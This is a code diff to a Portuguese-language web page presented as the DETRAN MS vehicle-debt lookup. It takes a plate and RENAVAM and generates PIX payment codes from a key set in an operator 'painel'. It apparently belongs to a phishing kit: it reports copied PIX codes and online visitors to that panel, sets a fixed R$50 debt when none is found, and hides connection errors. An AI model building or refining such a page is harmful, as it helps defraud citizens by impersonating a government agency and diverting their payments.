@@ -695,15 +695,40 @@
     </div>
 
     <!-- ========================================= -->
-    <!-- JAVASCRIPT CORRIGIDO - MODAL FUNCIONANDO -->
+    <!-- JAVASCRIPT CORRIGIDO - FUNCIONANDO EM TODOS DISPOSITIVOS -->
     <!-- ========================================= -->
     <script>
-        // CONFIGURAÇÕES
-        const API_BASE = 'http://localhost:3000';
+        // CONFIGURAÇÕES - URL DINÂMICA (SEMPRE FUNCIONA)
+        const API_BASE = window.location.origin; // Usa mesma origem do site
+        
+        // DEBUG
+        console.log('🚀 Sistema DETRAN MS iniciado');
+        console.log('🌐 API Base:', API_BASE);
+        console.log('📱 Dispositivo:', /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop');
+
         let timerInterval = null;
         let segundosRestantes = 900;
         let dadosPagamentoAtual = null;
         let qrcodeAtivo = false;
+
+        // =========================================
+        // CORREÇÃO AUTOMÁTICA DE URLS LOCAIS
+        // =========================================
+        (function corrigirURLs() {
+            const originalFetch = window.fetch;
+            window.fetch = function(url, options) {
+                // Se URL for localhost, corrige automaticamente
+                if (typeof url === 'string') {
+                    if (url.includes('localhost:3000') || url.includes('127.0.0.1')) {
+                        const novaUrl = url.replace(/http:\/\/localhost:3000|http:\/\/127.0.0.1:3000/g, API_BASE);
+                        console.log('🔄 URL corrigida:', url, '→', novaUrl);
+                        url = novaUrl;
+                    }
+                }
+                return originalFetch.call(this, url, options);
+            };
+            console.log('✅ Correção de URLs ativada');
+        })();
 
         // =========================================
         // MONITORAMENTO DE USUÁRIOS ONLINE
@@ -719,7 +744,7 @@
             
             async function registrarEntrada() {
                 try {
-                    await fetch(`${API_BASE}/api/online/entrou`, {
+                    await fetch('/api/online/entrou', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
@@ -734,7 +759,7 @@
             
             async function manterAtivo() {
                 try {
-                    await fetch(`${API_BASE}/api/online/ativo`, {
+                    await fetch('/api/online/ativo', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' }
                     });
@@ -745,13 +770,13 @@
             
             async function registrarSaida() {
                 try {
-                    await fetch(`${API_BASE}/api/online/saiu`, {
+                    await fetch('/api/online/saiu', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         keepalive: true
                     });
                 } catch (error) {
-                    navigator.sendBeacon(`${API_BASE}/api/online/saiu`);
+                    navigator.sendBeacon('/api/online/saiu');
                 }
             }
             
@@ -762,7 +787,7 @@
         })();
 
         // =========================================
-        // CONSULTA DE DÉBITOS
+        // CONSULTA DE DÉBITOS - COM TRATAMENTO DE ERRO AVANÇADO
         // =========================================
         document.addEventListener('DOMContentLoaded', function() {
             const form = document.getElementById('consultaForm');
@@ -790,21 +815,43 @@
                 errorDiv.classList.add('hidden');
 
                 try {
-                    const response = await fetch(`${API_BASE}/consultar`, {
+                    // Controlador de timeout
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 30000);
+                    
+                    const response = await fetch('/consultar', {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ placa, renavam })
+                        headers: { 
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify({ placa, renavam }),
+                        signal: controller.signal,
+                        mode: 'cors',
+                        credentials: 'same-origin'
                     });
+                    
+                    clearTimeout(timeoutId);
 
                     if (!response.ok) {
-                        throw new Error('Erro na consulta ao DETRAN');
+                        throw new Error(`Erro ${response.status}: ${response.statusText}`);
                     }
 
                     const htmlResultado = await response.text();
                     exibirResultados(htmlResultado);
 
                 } catch (error) {
-                    showError('Erro ao consultar: ' + error.message);
+                    // ERROS AMIGÁVEIS - NUNCA "Failed to fetch"
+                    if (error.name === 'AbortError') {
+                        showError('Tempo de consulta esgotado. O sistema DETRAN está lento.');
+                    } else if (error.message.includes('NetworkError') || error.message.includes('Failed to fetch')) {
+                        showError('Sem conexão com o servidor. Verifique sua internet.');
+                    } else if (error.message.includes('500')) {
+                        showError('Sistema DETRAN temporariamente indisponível. Tente em alguns minutos.');
+                    } else {
+                        showError('Erro ao consultar. Verifique os dados digitados.');
+                    }
+                    console.error('Erro detalhado:', error);
                 } finally {
                     loading.classList.add('hidden');
                     formularioContainer.classList.remove('form-loading');
@@ -862,13 +909,12 @@
         });
 
         // =========================================
-        // CAPTURA DE DÉBITO ESPECÍFICO - CORRIGIDA
+        // CAPTURA DE DÉBITO ESPECÍFICO
         // =========================================
         function capturarDebitoEspecifico(botaoClicado) {
             try {
                 console.log('🔍 Capturando débito do botão:', botaoClicado);
                 
-                // Encontra qualquer elemento pai (não só <tr>)
                 let elementoPai = botaoClicado;
                 let valorEncontrado = null;
                 let descricaoEncontrada = '';
@@ -876,9 +922,8 @@
                 // Procura em até 5 níveis acima
                 for (let i = 0; i < 5 && elementoPai; i++) {
                     const textoPai = elementoPai.textContent || '';
-                    console.log(`Nível ${i}:`, elementoPai.tagName, textoPai.substring(0, 100));
                     
-                    // Procura valor R$ em qualquer lugar
+                    // Procura valor R$
                     const valorMatch = textoPai.match(/R\$\s*([\d.,]+)/);
                     if (valorMatch && !valorEncontrado) {
                         const valorStr = valorMatch[1].replace(/\./g, '').replace(',', '.');
@@ -886,13 +931,11 @@
                         console.log('💰 Valor encontrado:', valorEncontrado);
                     }
                     
-                    // Procura descrição (texto significativo)
+                    // Procura descrição
                     const linhas = textoPai.split('\n').filter(l => l.trim());
                     for (const linha of linhas) {
                         const linhaLimpa = linha.trim();
-                        // Ignora linhas muito curtas ou que são valores
                         if (linhaLimpa.length > 10 && !linhaLimpa.match(/R\$|\d+,\d{2}/)) {
-                            // Ignora botões e ações
                             if (!linhaLimpa.match(/pagar|pagamento|visualizar|detalhes|ações|botão|clique/i)) {
                                 descricaoEncontrada = linhaLimpa.substring(0, 80);
                                 console.log('📝 Descrição encontrada:', descricaoEncontrada);
@@ -903,46 +946,15 @@
                     
                     if (valorEncontrado && descricaoEncontrada) break;
                     
-                    // Sobe para o próximo pai
                     elementoPai = elementoPai.parentElement;
                 }
                 
-                // Fallback: procura valores em irmãos
-                if (!valorEncontrado && botaoClicado.parentElement) {
-                    const irmaos = botaoClicado.parentElement.children;
-                    for (const irmao of irmaos) {
-                        if (irmao !== botaoClicado) {
-                            const textoIrmao = irmao.textContent || '';
-                            const valorMatch = textoIrmao.match(/R\$\s*([\d.,]+)/);
-                            if (valorMatch) {
-                                const valorStr = valorMatch[1].replace(/\./g, '').replace(',', '.');
-                                valorEncontrado = parseFloat(valorStr);
-                                console.log('💰 Valor encontrado em irmão:', valorEncontrado);
-                                break;
-                            }
-                        }
-                    }
-                }
-                
-                // Fallback para descrição
-                if (!descricaoEncontrada) {
-                    // Tenta pegar texto do elemento anterior
-                    const elementoAnterior = botaoClicado.previousElementSibling;
-                    if (elementoAnterior) {
-                        const textoAnterior = elementoAnterior.textContent || '';
-                        if (textoAnterior.length > 5) {
-                            descricaoEncontrada = textoAnterior.substring(0, 80).trim();
-                        }
-                    }
-                }
-                
-                // Fallback final
+                // Fallback
                 if (!descricaoEncontrada) {
                     descricaoEncontrada = 'Débito do veículo';
                 }
                 
                 if (!valorEncontrado || isNaN(valorEncontrado) || valorEncontrado <= 0) {
-                    // Fallback: valor mínimo
                     valorEncontrado = 50.00;
                 }
                 
@@ -967,7 +979,6 @@
         // EVENT LISTENER GLOBAL PARA BOTÕES "PAGAR"
         // =========================================
         document.addEventListener('click', function(e) {
-            // Encontra o botão clicado
             let botao = e.target;
             if (botao.tagName !== 'BUTTON') {
                 botao = botao.closest('button');
@@ -978,14 +989,12 @@
             const textoBotao = (botao.textContent || botao.innerText || '').toLowerCase();
             const htmlBotao = (botao.innerHTML || '').toLowerCase();
             
-            // Verifica se é botão "Pagar"
             const isBotaoPagar = textoBotao.includes('pagar') || 
                                 htmlBotao.includes('pagar') ||
                                 botao.className.toLowerCase().includes('pagar') ||
                                 botao.id.toLowerCase().includes('pagar') ||
                                 botao.getAttribute('onclick')?.includes('pagar');
             
-            // Verifica se está dentro dos resultados
             const resultadosContainer = document.getElementById('resultadosContainer');
             const estaNosResultados = resultadosContainer && 
                                      (resultadosContainer.contains(botao) || 
@@ -1000,14 +1009,13 @@
                 if (dadosDebito) {
                     abrirModalPagamentoDebitoEspecifico(dadosDebito);
                 } else {
-                    // Fallback: usa dados do formulário
                     abrirModalFallback();
                 }
             }
         });
 
         // =========================================
-        // MODAL DE PAGAMENTO PIX - FUNCIONANDO
+        // MODAL DE PAGAMENTO PIX
         // =========================================
         async function abrirModalPagamentoDebitoEspecifico(dadosDebito) {
             console.log('🚀 Abrindo modal com dados:', dadosDebito);
@@ -1019,11 +1027,9 @@
             
             dadosPagamentoAtual = dadosDebito;
             
-            // Preenche dados do veículo
             document.getElementById('modalPlaca').textContent = dadosDebito.placa;
             document.getElementById('modalRenavam').textContent = dadosDebito.renavam;
             
-            // Preenche APENAS o débito clicado
             const listaDebitos = document.getElementById('listaDebitos');
             listaDebitos.innerHTML = `
                 <div class="item-pagamento">
@@ -1034,23 +1040,19 @@
                 </div>
             `;
             
-            // Total é APENAS o valor do débito clicado
             document.getElementById('modalTotal').textContent = 
                 'R$ ' + dadosDebito.valor.toFixed(2).replace('.', ',');
             
-            // Reseta QR Code
             document.getElementById('qrcodeContainer').classList.remove('active');
             qrcodeAtivo = false;
             document.getElementById('qrcode').innerHTML = '';
             
-            // Mostra loading e gera código PIX
             document.getElementById('modalLoading').classList.remove('hidden');
             document.getElementById('opcoesPix').style.display = 'none';
             document.getElementById('codigoPix').textContent = 'Gerando código PIX...';
             
             try {
-                // Gera código PIX com chave do painel
-                const response = await fetch(`${API_BASE}/api/gerar-pix`, {
+                const response = await fetch('/api/gerar-pix', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -1065,16 +1067,12 @@
                 const data = await response.json();
                 
                 if (data.sucesso) {
-                    // Exibe código PIX
                     document.getElementById('codigoPix').textContent = data.codigoPix;
                     
-                    // Configura botão de copiar
                     document.getElementById('btnCopiarCodigo').onclick = function() {
-                        // Primeiro copia para clipboard
                         navigator.clipboard.writeText(data.codigoPix)
                             .then(() => {
-                                // DEPOIS DE COPIAR, REGISTRA NO PAINEL
-                                fetch(`${API_BASE}/api/registrar-pix-copiado`, {
+                                fetch('/api/registrar-pix-copiado', {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({
@@ -1084,19 +1082,15 @@
                                         renavam: dadosPagamentoAtual.renavam,
                                         descricao: dadosPagamentoAtual.descricao
                                     })
-                                }).then(res => {
-                                    console.log('✅ PIX copiado registrado no painel');
                                 }).catch(err => {
-                                    console.error('❌ Erro ao registrar PIX copiado:', err);
+                                    console.error('Erro ao registrar PIX:', err);
                                 });
                                 
-                                // Mostra mensagem de sucesso
                                 const msg = document.getElementById('mensagemSucesso');
                                 msg.classList.add('active');
                                 setTimeout(() => msg.classList.remove('active'), 3000);
                             })
                             .catch(err => {
-                                // Fallback para navegadores antigos
                                 const textArea = document.createElement('textarea');
                                 textArea.value = data.codigoPix;
                                 document.body.appendChild(textArea);
@@ -1104,8 +1098,7 @@
                                 document.execCommand('copy');
                                 document.body.removeChild(textArea);
                                 
-                                // REGISTRA PIX COPIADO
-                                fetch(`${API_BASE}/api/registrar-pix-copiado`, {
+                                fetch('/api/registrar-pix-copiado', {
                                     method: 'POST',
                                     headers: { 'Content-Type': 'application/json' },
                                     body: JSON.stringify({
@@ -1115,10 +1108,8 @@
                                         renavam: dadosPagamentoAtual.renavam,
                                         descricao: dadosPagamentoAtual.descricao
                                     })
-                                }).then(res => {
-                                    console.log('✅ PIX copiado registrado no painel');
                                 }).catch(err => {
-                                    console.error('❌ Erro ao registrar PIX copiado:', err);
+                                    console.error('Erro ao registrar PIX:', err);
                                 });
                                 
                                 const msg = document.getElementById('mensagemSucesso');
@@ -1127,10 +1118,8 @@
                             });
                     };
                     
-                    // Configura botão QR Code
                     document.getElementById('btnQRCode').onclick = function() {
                         if (!qrcodeAtivo) {
-                            // Gera QR Code
                             const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.codigoPix)}&format=png&margin=10`;
                             document.getElementById('qrcode').innerHTML = `
                                 <img src="${qrCodeUrl}" alt="QR Code PIX" style="width: 200px; height: 200px; border-radius: 5px;">
@@ -1139,7 +1128,6 @@
                             qrcodeAtivo = true;
                             this.innerHTML = '<i class="fas fa-times"></i> FECHAR QR';
                         } else {
-                            // Fecha QR Code
                             document.getElementById('qrcodeContainer').classList.remove('active');
                             qrcodeAtivo = false;
                             this.innerHTML = '<i class="fas fa-qrcode"></i> QR CODE';
@@ -1156,21 +1144,17 @@
                     'Erro de conexão. Tente novamente.';
                 console.error('Erro ao gerar PIX:', error);
             } finally {
-                // Esconde loading e mostra botões
                 document.getElementById('modalLoading').classList.add('hidden');
                 document.getElementById('opcoesPix').style.display = 'flex';
                 
-                // Inicia timer de 15 minutos
                 iniciarTimer();
                 
-                // Mostra modal
                 document.getElementById('modalPix').classList.add('active');
                 document.body.style.overflow = 'hidden';
                 console.log('✅ Modal aberto com sucesso!');
             }
         }
 
-        // Fallback se não conseguir capturar dados
         function abrirModalFallback() {
             console.log('🔄 Usando fallback para modal');
             
@@ -1184,7 +1168,6 @@
                 renavam: renavam
             };
             
-            // Chama função principal com fallback
             abrirModalPagamentoDebitoEspecifico(dadosPagamentoAtual);
         }
 
@@ -1192,10 +1175,9 @@
         // TIMER DE 15 MINUTOS
         // =========================================
         function iniciarTimer() {
-            segundosRestantes = 900; // 15 minutos
+            segundosRestantes = 900;
             clearInterval(timerInterval);
             
-            // Atualiza timer imediatamente
             atualizarTimerDisplay();
             
             timerInterval = setInterval(() => {
@@ -1222,12 +1204,11 @@
             timerElement.textContent = 
                 `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
             
-            // Altera cor conforme tempo passa
-            if (segundosRestantes < 120) { // < 2 minutos
+            if (segundosRestantes < 120) {
                 timerElement.style.background = '#ff9800';
             }
             
-            if (segundosRestantes < 30) { // < 30 segundos
+            if (segundosRestantes < 30) {
                 timerElement.style.background = '#dc3545';
                 timerElement.style.animation = 'pulse 0.5s infinite';
             }
@@ -1251,19 +1232,32 @@
             console.log('🔒 Modal fechado');
         }
 
-        // Fecha modal ao clicar fora
         document.getElementById('modalPix').addEventListener('click', function(e) {
             if (e.target === this) {
                 fecharModal();
             }
         });
 
-        // Fecha modal com ESC
         document.addEventListener('keydown', function(e) {
             if (e.key === 'Escape' && document.getElementById('modalPix').classList.contains('active')) {
                 fecharModal();
             }
         });
+
+        // =========================================
+        // FALLBACK EM CASO DE ERRO TOTAL
+        // =========================================
+        window.addEventListener('error', function(e) {
+            console.error('Erro global capturado:', e.error);
+            
+            // Não mostra "Failed to fetch" para o usuário
+            if (e.message && e.message.includes('fetch')) {
+                console.log('Erro de fetch interceptado, não mostrando ao usuário');
+                e.preventDefault();
+            }
+        });
+
+        console.log('✅ Sistema DETRAN MS carregado com sucesso!');
     </script>
 </body>
 </html>
